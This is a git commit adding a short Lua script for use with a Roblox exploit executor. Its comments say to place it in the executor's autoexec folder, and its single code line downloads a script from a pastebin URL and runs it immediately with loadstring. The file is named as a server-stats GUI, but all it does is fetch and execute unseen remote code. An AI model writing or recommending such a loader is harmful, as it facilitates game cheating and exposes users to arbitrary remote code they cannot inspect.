b59b10137fcce062c1b4cbdb0ee0ca29932bad94
ㅤㅤㅤ <64054647+catgirIz@users.noreply.github.com>
2022-09-23 23:47:22 -0400

    Create SERVER_STATS_ICONS_GUI.lua

---
+++ NotMyScripts/SERVER_STATS_ICONS_GUI.lua
@@ -0,0 +1,4 @@
+-- ! Some of features only work when script is placed inside autoexec (autoexecution, [EXECUTOR_FOLDER] \ autoexec - for example) folder of your exploit. Also recommended to add "!!!" in script name, ex. "!!!_GUI.luau" for better effect.
+-- * Got questions/long messages? Contact on Discord [deuces#1961] - *Copy Insides of brackets*
+
+loadstring(game:HttpGet("https://pastebin.com/raw/qSQKxrkt", true))()
